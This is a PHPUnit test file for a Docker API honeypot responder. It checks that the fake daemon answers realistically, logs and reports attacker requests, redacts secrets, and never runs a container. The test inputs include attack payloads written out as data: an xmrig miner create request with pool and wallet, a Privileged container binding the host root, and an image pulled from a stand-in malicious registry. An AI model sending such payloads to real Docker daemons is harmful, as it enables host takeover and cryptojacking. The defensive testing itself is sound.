<?php

declare(strict_types=1);

namespace Funnypot\Tests\App\Docker;

use Funnypot\App\Docker\DockerApiResponder;
use Funnypot\App\Storage\SqliteHitStore;
use Funnypot\App\ThreatIntel\AbuseIpdb;
use Funnypot\Core\RequestContext;
use PHPUnit\Framework\TestCase;
use stdClass;

/**
 * The Docker responder end to end with temp sqlite stores and a sink-backed emit (no real headers): the
 * right status/content-type/JSON shape per endpoint, the create/start intent captured to the feed, and
 * — the whole point — 100% inertness: a created container is never persisted and nothing runs.
 */
final class DockerApiResponderTest extends TestCase
{
    private const IP = '9.9.9.9';        // public/routable, so AbuseIPDB queues it
    private const SEED = 7;
    private const NOW = 1_700_000_000;

    /** @var string[] */
    private array $tmp = [];
    private ?SqliteHitStore $store = null;
    private ?AbuseIpdb $abuse = null;
    private string $intelDb = '';
    private string $logPath = '';
    private stdClass $cap;

    protected function setUp(): void
    {
        if (!extension_loaded('pdo_sqlite')) {
            self::markTestSkipped('ext-pdo_sqlite not loaded');
        }
        $this->cap = new stdClass();
        $this->cap->status = 0;
        $this->cap->headers = [];
        $this->cap->body = '';
    }

    protected function tearDown(): void
    {
        foreach ($this->tmp as $f) {
            foreach (['', '-wal', '-shm'] as $s) {
                @unlink($f . $s);
            }
        }
        $this->tmp = [];
    }

    private function dbPath(string $n): string
    {
        $p = sys_get_temp_dir() . "/fpdock_{$n}_" . bin2hex(random_bytes(6)) . '.sqlite';
        $this->tmp[] = $p;

        return $p;
    }

    private function make(): DockerApiResponder
    {
        $this->logPath = $this->dbPath('export') . '.log';
        $this->store = new SqliteHitStore($this->dbPath('hits'), $this->logPath);
        $this->intelDb = $this->dbPath('intel');
        $this->abuse = new AbuseIpdb('testkey', $this->intelDb, ['10.0.0.1']);
        $cap = $this->cap;

        return new DockerApiResponder(
            $this->store,
            self::SEED,
            $this->abuse,
            static fn (): int => self::NOW,
            static function (int $s, array $h, string $b) use ($cap): void {
                $cap->status = $s;
                $cap->headers = $h;
                $cap->body = $b;
            },
        );
    }

    /** @param array<string,mixed>|null $body */
    private function ctx(string $method, string $path, ?array $body = null): RequestContext
    {
        return new RequestContext($method, $path, '', [], $body === null ? null : (string) json_encode($body));
    }

    /** @return array<string,mixed> the last logged row (stored columns: ts/ip/method/path/severity/…) */
    private function lastRow(): array
    {
        $rows = $this->store->delta(0)['rows'];
        self::assertNotEmpty($rows, 'the hit should have been logged');

        return $rows[count($rows) - 1];
    }

    /** @return array<string,mixed> the last JSON-lines export entry (carries the parsed image/cmd
     *  intel that has no dedicated SQLite column, exactly as the dashboard export receives it). */
    private function lastExport(): array
    {
        $lines = array_values(array_filter(explode("\n", (string) file_get_contents($this->logPath))));
        self::assertNotEmpty($lines, 'an export line should have been written');

        return (array) json_decode($lines[count($lines) - 1], true);
    }

    public function test_ping_returns_ok_as_text_with_the_api_version_header(): void
    {
        $this->make()->respond($this->ctx('GET', '/_ping'), self::IP);

        self::assertSame(200, $this->cap->status);
        self::assertSame('OK', $this->cap->body);
        self::assertSame('text/plain; charset=utf-8', $this->cap->headers['Content-Type']);
        self::assertSame('1.43', $this->cap->headers['Api-Version']);
        self::assertArrayNotHasKey('X-Powered-By', $this->cap->headers);
        self::assertSame('/_ping', $this->lastRow()['path']);
    }

    public function test_version_returns_the_daemon_json(): void
    {
        $this->make()->respond($this->ctx('GET', '/v1.24/version'), self::IP);

        self::assertSame(200, $this->cap->status);
        self::assertSame('application/json', $this->cap->headers['Content-Type']);
        $body = json_decode($this->cap->body, true);
        self::assertSame('24.0.5', $body['Version']);
        self::assertSame('1.43', $body['ApiVersion']);
        self::assertArrayNotHasKey('X-Powered-By', $this->cap->headers);
    }

    public function test_info_returns_a_production_node(): void
    {
        $this->make()->respond($this->ctx('GET', '/info'), self::IP);

        self::assertSame(200, $this->cap->status);
        $body = json_decode($this->cap->body, true);
        self::assertSame('24.0.5', $body['ServerVersion']);
        self::assertSame('linux', $body['OSType']);
        self::assertSame(5, $body['ContainersRunning']);
    }

    public function test_containers_json_lists_the_fleet(): void
    {
        $this->make()->respond($this->ctx('GET', '/containers/json'), self::IP);

        self::assertSame(200, $this->cap->status);
        $rows = json_decode($this->cap->body, true);
        self::assertCount(5, $rows);
        $names = array_map(static fn ($c) => ltrim($c['Names'][0], '/'), $rows);
        self::assertContains('eth-validator-staker', $names);
        self::assertContains('vault-secret-store', $names);
    }

    public function test_images_json_lists_images(): void
    {
        $this->make()->respond($this->ctx('GET', '/images/json'), self::IP);

        self::assertSame(200, $this->cap->status);
        $rows = json_decode($this->cap->body, true);
        self::assertNotEmpty($rows);
        self::assertStringStartsWith('sha256:', $rows[0]['Id']);
    }

    public function test_create_returns_an_id_and_logs_the_attacker_image_and_command(): void
    {
        $responder = $this->make();
        $responder->respond($this->ctx('POST', '/v1.24/containers/create', [
            'Image' => 'xmrig/xmrig',
            'Cmd' => ['-o', 'pool.minexmr.com:4444', '-u', 'attacker-wallet'],
            'HostConfig' => ['Binds' => ['/:/host'], 'Privileged' => true],
        ]), self::IP);

        self::assertSame(201, $this->cap->status);
        self::assertSame('application/json', $this->cap->headers['Content-Type']);
        $body = json_decode($this->cap->body, true);
        self::assertMatchesRegularExpression('/^[0-9a-f]{64}$/', $body['Id']);
        self::assertNull($body['Warnings']);

        // the requested image + command are captured as the recon intel (parsed fields ride the export)
        $export = $this->lastExport();
        self::assertSame('xmrig/xmrig', $export['image']);
        self::assertStringContainsString('pool.minexmr.com:4444', $export['cmd']);
        // the raw create payload is stored on the queryable row (image, pool and the tell-tale
        // Privileged/Binds escape config), and the hit is high severity
        $row = $this->lastRow();
        self::assertStringContainsString('xmrig', (string) $row['body']);
        self::assertStringContainsString('Privileged', (string) $row['body']);
        self::assertSame('high', $row['severity']);

        // reported to AbuseIPDB with the image in the comment
        self::assertSame(1, $this->abuse->queueCount());
    }

    /**
     * FP-0247 (re-review NIT): the queued comment goes through ReportComment sanitisation. A credential
     * embedded in the attacker-supplied image ref is redacted, but the registry HOSTNAME is KEPT — it
     * is intel about what the attacker tried to deploy, not attribution of an innocent third party.
     */
    public function test_queued_comment_sanitises_secret_but_keeps_registry_host(): void
    {
        $responder = $this->make();
        $responder->respond($this->ctx('POST', '/v1.24/containers/create', [
            'Image' => 'evil-registry.example/miner:latest?access_token=SECRETXYZ',
        ]), self::IP);

        self::assertSame(1, $this->abuse->queueCount());
        $comment = $this->lastQueuedComment();
        self::assertStringNotContainsString('SECRETXYZ', $comment, 'a credential in the image ref must be redacted');
        self::assertStringContainsString('[redacted]', $comment);
        self::assertStringContainsString('evil-registry.example', $comment, 'the registry host is intel and must be kept');
    }

    private function lastQueuedComment(): string
    {
        $pdo = new \PDO('sqlite:' . $this->intelDb);
        $pdo->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);

        return (string) $pdo->query('SELECT comment FROM abuse_queue ORDER BY id DESC LIMIT 1')->fetchColumn();
    }

    public function test_create_with_a_malformed_body_still_succeeds_inertly(): void
    {
        $responder = $this->make();
        $responder->respond(new RequestContext('POST', '/containers/create', '', [], 'not json at all'), self::IP);

        self::assertSame(201, $this->cap->status);
        $body = json_decode($this->cap->body, true);
        self::assertMatchesRegularExpression('/^[0-9a-f]{64}$/', $body['Id']);
        self::assertSame('', $this->lastExport()['image']);
    }

    public function test_start_returns_204_no_content_and_logs(): void
    {
        $this->make()->respond($this->ctx('POST', '/v1.24/containers/c8a1e94fc07b/start'), self::IP);

        self::assertSame(204, $this->cap->status);
        self::assertSame('', $this->cap->body);
        $row = $this->lastRow();
        self::assertStringEndsWith('/start', $row['path']);
        self::assertSame('POST', $row['method']);
    }

    public function test_created_container_is_never_persisted_no_state_no_process(): void
    {
        $responder = $this->make();

        // Deploy a "miner", then start it — the classic exposed-daemon abuse chain.
        $responder->respond($this->ctx('POST', '/containers/create', ['Image' => 'xmrig/xmrig', 'Cmd' => ['run']]), self::IP);
        $createdId = json_decode($this->cap->body, true)['Id'];
        $responder->respond($this->ctx('POST', "/containers/{$createdId}/start"), self::IP);

        // The container list still shows only the seeded fleet — the attacker's container does not exist.
        $responder->respond($this->ctx('GET', '/containers/json'), self::IP);
        $rows = json_decode($this->cap->body, true);
        self::assertCount(5, $rows, 'no attacker container may appear in the list');
        $ids = array_column($rows, 'Id');
        self::assertNotContains($createdId, $ids, 'the created id must name nothing that persists');
    }

    public function test_hit_is_labelled_docker_api_and_shows_on_the_feed(): void
    {
        $this->make()->respond($this->ctx('GET', '/version'), self::IP);

        $row = $this->lastRow();
        self::assertTrue((bool) $row['matched']);
        self::assertTrue((bool) $row['served']);
        self::assertContains('payload-docker_api', (array) $row['templates']);
    }
}
